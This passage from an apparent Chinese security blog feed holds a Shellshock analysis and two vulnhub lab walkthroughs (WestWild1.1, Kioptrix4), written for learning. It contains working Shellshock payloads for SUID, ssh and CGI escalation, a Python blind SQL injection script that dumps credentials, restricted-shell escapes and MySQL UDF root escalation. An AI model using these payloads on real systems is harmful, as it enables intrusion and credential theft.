href="#1、bash对于函数变量的解析" class="headerlink" title="1、bash对于函数变量的解析"></a>1、bash对于函数变量的解析</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404144334.png" alt="image.png"></p><blockquote><p>新的bash进程会重新加载环境变量，此时解析器若发现括号和花括号时就会认定它是函数定义<br>这就是子进程错把字符串形式的变量解析为函数变量的原因</p></blockquote><h3 id="2、尾部代码注入"><a href="#2、尾部代码注入" class="headerlink" title="2、尾部代码注入"></a>2、尾部代码注入</h3><blockquote><p>关于为什么bash把函数体解析完之后会去执行后面的注入语句：</p></blockquote><blockquote><p>有漏洞的bash的源码：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404161022.png" alt="image.png"></p><blockquote><p>简单分析源码，Bash初始化时调用了<code>builtins/evalstring.c</code>里的<code>parse_and_execute</code>函数。是的，就等于Bash初始化环境时调用了类似其他高级语言中的<code>eval</code>函数，它负责解析字符串输入并执行。但是又未对变量进行截取、过滤，导致读到后括号 } 时没有结束！</p></blockquote><blockquote><p>其实Bash本身其实是想在启动时初始环境变量以及定义一些函数，而初始的方式就是去把 <code>变量名=值</code> 这样的赋值语句用eval去执行一次，如果出现了函数定义，就把它转变成函数，除此之外就不想让它干其他的了，可偏偏它在扫描到函数定义时，把它转变成函数的过程中不小心执行了后面的命令，这其实不是eval的错，这是做语法解析时没考虑严格，所以补丁加了这么一句话来判断函数体合法性：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> ((flags &amp;amp; SEVAL_FUNCDEF) &amp;amp;&amp;amp; command-&amp;gt;type != cm_function_def)<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404163420.png" alt="image.png"></p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><blockquote><p>经典payload：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span> c=<span class="hljs-string">&#x27;() &#123; :;&#125;; echo 1&#x27;</span> bash -c <span class="hljs-string">&#x27;echo 2&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404182814.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404182822.png" alt="image.png"></p><blockquote><p>定义一个字符串型函数环境变量，尾部注入检测点echo 1，最后启动一个新bash触发被注入代码<br>注意空格之类的细节</p></blockquote><h3 id="攻击suid程序本地提权"><a href="#攻击suid程序本地提权" class="headerlink" title="攻击suid程序本地提权"></a>攻击suid程序本地提权</h3><blockquote><p>将system中写死命令的执行点利用shellshock进行转移外带</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405212529.png" alt="image.png"></p><blockquote><p>假设现在有这样一个有s位的可执行文件，由root编译且setuid，system中的命令写死&#x2F;bin&#x2F;ls，即不能执行其他命令，且因为写死了&#x2F;bin也不能劫持ls，此时便可用shellshock转移外带出执行点！</p></blockquote><p>1、将&#x2F;bin&#x2F;sh软链接到存在漏洞的bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -sf /bin/bash /bin/sh<br></code></pre></td></tr></table></figure><blockquote><p>因为system底层使用的是&#x2F;bin&#x2F;sh，并非bash<br>此时执行文件已可以启动有漏洞的bash</p></blockquote><p>2、导入永久型函数环境变量、执行s位文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> <span class="hljs-built_in">test</span>=<span class="hljs-string">&#x27;() &#123; :;&#125;;/bin/bash -p&#x27;</span><br>./exp<br></code></pre></td></tr></table></figure><blockquote><p>此时只要启动bash就会加载一次环境变量test、执行一次被注入的语句(可以是反弹shell)，从而转移出命令执行点，由于最初的触发点是root的s位，所以拿到的会是root shell</p></blockquote><p>注意：做题时一定注意反编译出的可执行文件有没有setuid0（设置进程uid为root），若没有就是虚假的s位文件，无法利用！（即需要同时设置文件的suid和进程的suid，才真正有root权限）</p><h3 id="攻击ssh"><a href="#攻击ssh" class="headerlink" title="攻击ssh"></a>攻击ssh</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405223202.png" alt="image.png"></p><blockquote><p>先来看openssh的阻止特定用户ssh登录功能：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405223605.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i identity_file shocker@140.20.11.30<br>The authenticity of host <span class="hljs-string">&#x27;140.20.11.30 (140.20.11.30)&#x27;</span> can<span class="hljs-string">&#x27;t be established</span><br><span class="hljs-string">...</span><br><span class="hljs-string">Enter passphrase for key &#x27;</span>identity_file<span class="hljs-string">&#x27;:</span><br><span class="hljs-string">welcome</span><br><span class="hljs-string">Connection to 140.20.11.30 closed.</span><br></code></pre></td></tr></table></figure><blockquote><p>对比两种方式：<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405223816.png" alt="image.png"><br>个人理解：forcecommand由操作系统完成，用户配置文件的command和客户端ssh链接时携带的命令属于同一类型</p></blockquote><p>接下来来看openssh提供的客户端可携带命令的功能：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh -i identity_file <span class="hljs-built_in">test</span>@140.20.11.30 <span class="hljs-string">&#x27;echo USER=$USER and SHELL=$SHELL&#x27;</span><br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;identity_file&#x27;</span>: <br>USER=<span class="hljs-built_in">test</span> and SHELL=/bin/bash<br></code></pre></td></tr></table></figure><blockquote><p>openssh允许用户在登录语句携带命令，登录成功后执行，但优先级低于两种command，即若服务端主动关闭连接就会无法执行</p></blockquote><p>漏洞产生：</p><blockquote><p>当客户端提供使用 ssh 命令运行的命令时，sshd 会将其复制到 SSH_ORIGINAL_COMMAND 变量中，但仅运行强制命令。尽管如此，由于 SSH_ORIGINAL_COMMAND 是一个<strong>环境变量</strong>，我们可以通过传递以 Bash 函数开头的命令来利用 Shellshock，这为我们提供了一种绕过施加限制的方法</p></blockquote><blockquote><p>一句话概括：登陆语句携带的命令会寄存在这个环境变量中，此时若服务器存在bashshock，即可完成shellshock所需的环境变量注入，从而执行任意命令，如反弹shell，最后获得稳定shell</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405230723.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i identity_file shocker@140.20.11.30 <span class="hljs-string">&#x27;() &#123; :;&#125;; echo USER=$USER and SHELL=$SHELL&#x27;</span><br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;identity_file&#x27;</span>:<br>USER=shocker and SHELL=/bin/bash<br>welcome<br></code></pre></td></tr></table></figure><blockquote><p>例题：vulnhub的tr0ll2</p></blockquote><h3 id="攻击cgi程序"><a href="#攻击cgi程序" class="headerlink" title="攻击cgi程序"></a>攻击cgi程序</h3><blockquote><p>前置知识：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405231758.png" alt="image.png"></p><blockquote><p>原理：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405231901.png" alt="image.png"></p><blockquote><p>利用条件：<br>1、启用cgi，且可以访问到cgi-bin下的cgi程序<br>2、bash版本存在shellshock</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240406153231.png" alt="image.png"></p><blockquote><p>例题：vulnhub pwnos1</p></blockquote><h3 id="攻击dhcp"><a href="#攻击dhcp" class="headerlink" title="攻击dhcp"></a>攻击dhcp</h3><blockquote><p>当攻击者拿下dhcp服务器时，可攻击存在shellshock的客户机，利用114号option会作为额外option注入客户端环境变量，达成对客户端的rce</p></blockquote><blockquote><p>dhcp服务器的处理流程：</p></blockquote><ol><li><strong>DHCP Discover和Offer</strong>：<ul><li>Linux Client发送DHCP Discover报文以请求IP地址和其他网络配置信息。</li><li>DHCP服务器接收到Discover报文后，根据配置构建Offer报文，并包含IP地址、子网掩码等参数，以及额外Option中的114号参数，该参数代表Url参数，后续会被添加如环境变量。</li></ul></li><li><strong>DHCP Request和Ack</strong>：<ul><li>Linux Client接收到DHCP服务器发送的Offer报文后，可能会发送DHCP Request报文以确认所提供的网络配置。</li><li>DHCP服务器接收到Request报文后，如果同意提供配置，将发送DHCP Ack报文确认。</li><li>Linux Client在接收到Ack报文后，将配置应用到其网络接口。</li></ul></li><li><strong>Client调用Bash对端口以相关参数赋值</strong>：<ul><li>一旦Linux Client成功获得IP地址和其他网络配置，会调用Bash脚本对网络接口进行配置，并将DHCP服务器提供的参数作为环境变量传递给该脚本，其中就包括114号参数</li></ul></li></ol><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240406154553.png" alt="image.png"></p><blockquote><p>当client请求dhcp服务器时触发shellshock反弹出客户机shell</p></blockquote><h2 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06 参考资料"></a>0x06 参考资料</h2><p><a href="https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/">Bash 3.0-4.3命令执行漏洞分析 - 知道创宇 (knownsec.com)</a><br><a href="https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html">Shellshock漏洞回顾与分析测试 - Debug_Orz (wooyun.js.org)</a><br><a href="https://www.zhihu.com/tardis/zm/art/35579956?source_id=1005">什么是ShellShock攻击？ (zhihu.com)</a><br><a href="https://www.cnblogs.com/Cl0ud/p/14248937.html">Bash 破壳漏洞Shellshock （CVE-2014-6271）复现分析 - 春告鳥 - 博客园 (cnblogs.com)</a><br><a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">Shellshock（软件错误） - 维基百科，自由的百科全书 — Shellshock (software bug) - Wikipedia</a><br>[ShellShock 攻击实<a href="https://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/">Shellshock (Bash CVE-2014-6271) 威脅仍在擴大中，但無需過度恐慌 | DEVCORE 戴夫寇爾</a><br><a href="https://developer.aliyun.com/article/473063">关于ShellShock对企业网络服务器的攻击以及防范手段-阿里云开发者社区 (aliyun.com)</a><br><a href="https://security.stackexchange.com/questions/68877/shellshock-dhcp-exploitation">bash - shellshock DHCP 漏洞利用 - 信息安全堆栈交换 — bash - shellshock dhcp exploitation - Information Security Stack Exchange</a><br><a href="https://www.zhihu.com/tardis/zm/art/35579956?source_id=1005">https://www.zhihu.com/tardis/zm/art/35579956?source_id=1005</a><br><a href="https://www.cnblogs.com/Cl0ud/p/14248937.html">https://www.cnblogs.com/Cl0ud/p/14248937.html</a><br><a href="https://zhuanlan.zhihu.com/p/21365920">https://zhuanlan.zhihu.com/p/21365920</a><br> <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">https://en.wikipedia.org/wiki/Shellshock_(software_bug)</a><br><a href="https://www.freebuf.com/articles/system/279713.html">https://www.freebuf.com/articles/system/279713.html</a><br><a href="https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html">https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>vuln</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub WestWild1.1</title>
    <link href="/2024/04/02/WestWild1.1/"/>
    <url>/2024/04/02/WestWild1.1/</url>
    
    <content type="html"><![CDATA[<p>vulhub WestWild1.1 walkthrough</p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195209.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195221.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195230.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195239.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195247.png" alt="image.png"></p><blockquote><p>开启smb、web、ssh</p></blockquote><h2 id="0x02-smb渗透"><a href="#0x02-smb渗透" class="headerlink" title="0x02 smb渗透"></a>0x02 smb渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195304.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195315.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195323.png" alt="image.png"></p><blockquote><p>Aveng说自己忘记密码了，让Wave替他重置，有点懵，先web看看：</p></blockquote><h2 id="0x03-web渗透"><a href="#0x03-web渗透" class="headerlink" title="0x03 web渗透"></a>0x03 web渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195343.png" alt="image.png"></p><blockquote><p>没有别的信息，只说跟着Wave走</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195358.png" alt="image.png"></p><blockquote><p>目录爆破也没什么信息<br>想起来刚刚有关flag是base64的，查看：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195559.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195611.png" alt="image.png"></p><blockquote><p>拿到立足点</p></blockquote><h2 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04 提权"></a>0x04 提权</h2><blockquote><p>初步跑了linEnum没有结果，跑linpeas：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195622.png" alt="image.png"></p><blockquote><p>发现一个可疑脚本，且有写权限</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195633.png" alt="image.png"></p><blockquote><p>得到新凭据</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195643.png" alt="image.png"></p><blockquote><p>成功提权</p></blockquote><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><ol><li>端口扫描：开启smb、web、ssh</li><li>smb渗透：空密码登录拿到第一个用户凭据，ssh登录拿到立足点</li><li>提权：发现低权限用户名下有可写执行脚本，执行拿到第二个凭据，提权到高权限用户；新用户为 sudo ALL，直接提权</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub Kioptrix4</title>
    <link href="/2024/04/02/Kioptrix4/"/>
    <url>/2024/04/02/Kioptrix4/</url>
    
    <content type="html"><![CDATA[<p>vulhub Kioptrix4 walkthrough</p><blockquote><p>关于配置只给了vmdk，无vmx，需要自建虚拟机：<br>  新建虚拟机，选择自定义模式，安装来源选择“稍后安装”，然后在客户机操作系统选择“其他”，选择位置为解压后放置vmdk文件的文件夹，设置为1核512M，一路默认，在选择磁盘处选择“使用现有虚拟磁盘”，然后选择vmdk文件，出现提示后选择“保持现有格式”。</p></blockquote><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402193852.png" alt="image.png"></p><blockquote><p>开了两个smb、web、ssh</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402193902.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402193915.png" alt="image.png"></p><h2 id="0x02-smb渗透"><a href="#0x02-smb渗透" class="headerlink" title="0x02 smb渗透"></a>0x02 smb渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402193926.png" alt="image.png"></p><blockquote><p>可以匿名访问，但是没有有效信息，先放下</p></blockquote><h2 id="0x03-web渗透"><a href="#0x03-web渗透" class="headerlink" title="0x03 web渗透"></a>0x03 web渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402193935.png" alt="image.png"></p><blockquote><p>目录爆破发现一个数据库文件和登录页，先看sql文件：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402193945.png" alt="image.png"></p><blockquote><p>创建了members表，其中有username,password,id列，插入<code>john@1234</code>的信息<br>拿john的凭据去登录：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402193958.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194015.png" alt="image.png"></p><blockquote><p>都登录失败，测sql注入：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194023.png" alt="image.png"></p><blockquote><p>mypassword处有注入点</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194032.png" alt="image.png"></p><blockquote><p>一句话可以进，随意修改name值发现cookie不会变，尝试破解cookie</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194040.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194054.png" alt="image.png"></p><blockquote><p>只能老老实实注入了</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194108.png" alt="image.png"></p><blockquote><p>存在布尔盲注</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <br><span class="hljs-keyword">import</span> time  <br>url=<span class="hljs-string">&quot;http://10.10.10.137/checklogin.php&quot;</span> <span class="hljs-comment">#记得添加url  </span><br>result=<span class="hljs-string">&quot;&quot;</span>  <br>op = <span class="hljs-string">&quot;&quot;</span>  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50000</span>):  <span class="hljs-comment">#i是长度  </span><br>    l=<span class="hljs-built_in">int</span>(<span class="hljs-number">0</span>)  <br>    r=<span class="hljs-built_in">int</span>(<span class="hljs-number">128</span>)  <br>    <span class="hljs-keyword">while</span> l&lt;r:  <br>        j=(l+r)&gt;&gt;<span class="hljs-number">1</span>  <br>        payload0=&#123;  <br>            <span class="hljs-comment">#&quot;mypassword&quot;: f&quot;&#x27; or ascii(substr(database(),&#123;i&#125;,1)) &gt; &#123;j&#125;#&quot;,  </span><br>            <span class="hljs-comment">#&quot;mypassword&quot;: f&quot;&#x27; or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=\&quot;members\&quot;),&#123;i&#125;,1)) &gt; &#123;j&#125;#&quot;,            #&quot;mypassword&quot;: f&quot;&#x27; or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=\&quot;members\&quot;),&#123;i&#125;,1)) &gt; &#123;j&#125;#&quot;,            &quot;mypassword&quot;: f&quot;&#x27; or ascii(substr((select(group_concat(id,0x7c,username,0x7c,password,0x7c))from(members)),&#123;i&#125;,1)) &gt; &#123;j&#125;#&quot;,  </span><br>            <span class="hljs-string">&quot;myusername&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,  <br>            <span class="hljs-string">&quot;submit&quot;</span>:<span class="hljs-string">&quot;Login&quot;</span>  <br>        &#125;  <br>        result =requests.post(url=url,data=payload0)  <br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;Wrong Username or Password&#x27;</span> <span class="hljs-keyword">in</span> result.text):  <br>            r=j  <br>        <span class="hljs-keyword">else</span>:  <br>            l=j+<span class="hljs-number">1</span>  <br>    op+=<span class="hljs-built_in">chr</span>(l)  <br>    <span class="hljs-built_in">print</span>(op)<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194119.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194139.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194152.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194202.png" alt="image.png"></p><blockquote><p>拿到两个凭据：</p><ol><li>john@MyNameIsJohn</li><li>robert@ADGAdsafdfwt4gadfga&#x3D;&#x3D;</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194208.png" alt="image.png"></p><blockquote><p>登录web页面好像什么用也没有，尝试ssh：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh john@10.10.10.137 -oHostKeyAlgorithms=ssh-rsa,ssh-dss <br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194222.png" alt="image.png"></p><blockquote><p>全部登录成功，一下两个shell</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194236.png" alt="image.png"></p><blockquote><p>白高兴，两个全是不能用的shell<br>尝试注入写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194243.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194252.png" alt="image.png"></p><blockquote><p>反弹shell：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194300.png" alt="image.png"></p><h2 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04 提权"></a>0x04 提权</h2><blockquote><p>简单枚举无提权向量，且内核版本很低，考虑内核提权</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194319.png" alt="image.png"></p><blockquote><p>遗憾的是www-data用户无法使用wget</p></blockquote><h3 id="kshell-修补"><a href="#kshell-修补" class="headerlink" title="kshell 修补"></a>kshell 修补</h3><blockquote><p>横向回到john用户，期望这个用户可以用wget，尝试修补shell环境：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194333.png" alt="image.png"></p><blockquote><p>可用指令有echo，使用<code>echo os.system(&quot;/bin/bash&quot;)</code>修补shell：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194342.png" alt="image.png"></p><blockquote><p>好好好，可以确定wget是用不了了<br>查看是否有gcc</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194352.png" alt="image.png"></p><blockquote><p>没装gcc，果然可以放弃内核提权了</p></blockquote><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><blockquote><p>udf提权：上传自定义动态链接库so文件–system_exec达成命令执行，若mysql进程为root名下，则可以root身份命令执行</p></blockquote><blockquote><p>本机满足的利用条件：</p><ol><li>数据库管理员权限运行</li><li>数据库的版本信息不高于 5.5.6</li></ol></blockquote><blockquote><p>查看对内网开启的端口：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps -ef | grep <span class="hljs-string">&quot;mysql&quot;</span><br>netstat -tnl<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194404.png" alt="image.png"></p><blockquote><p>尝试无密码登录：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194418.png" alt="image.png"></p><blockquote><p>满足提权要求，开始udf提权：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194429.png" alt="image.png"></p><blockquote><p>查看mysql库–func表下是否已经有可命令执行的so文件，发现已经存在，直接利用：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194449.png" alt="image.png"></p><blockquote><p>whoami回显为NULL，无须害怕直接弹shell，拿到root shell</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194456.png" alt="image.png"></p><h2 id="0x05-反思补足总结"><a href="#0x05-反思补足总结" class="headerlink" title="0x05 反思补足总结"></a>0x05 反思补足总结</h2><h3 id="wget-无法执行（todo）"><a href="#wget-无法执行（todo）" class="headerlink" title="wget 无法执行（todo）"></a>wget 无法执行（todo）</h3><blockquote><p>root shell也无法运行wget</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194526.png" alt="image.png"></p><blockquote><p>不过可以使用curl -o替代</p></blockquote><h3 id="limited-shell绕过"><a href="#limited-shell绕过" class="headerlink" title="limited shell绕过"></a>limited shell绕过</h3><blockquote><ol><li><code>echo os.system(&#39;/bin/bash&#39;)</code></li></ol></blockquote><blockquote><ol start="2"><li><code>vim</code>：<br> <img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194537.png" alt="image.png"></li></ol></blockquote><blockquote><ol start="3"><li>其余手法：<a href="https://www.sans.org/blog/escaping-restricted-linux-shells/">Escaping Restricted Linux Shells</a></li></ol></blockquote><h3 id="nmap的smb用户枚举"><a href="#nmap的smb用户枚举" class="headerlink" title="nmap的smb用户枚举"></a>nmap的smb用户枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sC --script=smb-enum-users 10.10.10.137<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194546.png" alt="image.png"></p><h3 id="UDF提权-1"><a href="#UDF提权-1" class="headerlink" title="UDF提权"></a>UDF提权</h3><blockquote><p>介绍：<a href="https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html">使用 MySQL UDF 执行命令</a></p></blockquote><blockquote><ol><li>已自带sys_exec函数：见上文</li></ol></blockquote><blockquote><ol start="2"><li>未自带需自行上传so文件： blog.csdn.net&#x2F;m0_66299232&#x2F;article&#x2F;details&#x2F;130823248 、或参照exp1518.c</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194558.png" alt="image.png"></p><blockquote><p>使用条件：</p></blockquote><ol><li>可使用的数据库账户有<code>select insert create</code>权限</li><li><code>secure_file_priv</code>为空：该参数规定了数据库可以操控的目录</li><li>数据库进程在目标(高权限)用户名下：使用UDF命令执行即用该账户命令执行</li><li>(非必要) gcc：在本机或靶机编译为so文件都可</li></ol><h3 id="使用linEnum对提权向量初步枚举"><a href="#使用linEnum对提权向量初步枚举" class="headerlink" title="使用linEnum对提权向量初步枚举"></a>使用linEnum对提权向量初步枚举</h3><blockquote><p>可完成大量基础向量枚举，但无法探测内核漏洞，故判断为内核提权时仍需跑linpeas</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194609.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194621.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194715.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194725.png" alt="image.png"></p><h2 id="0x06-靶机总结"><a href="#0x06-靶机总结" class="headerlink" title="0x06 靶机总结"></a>0x06 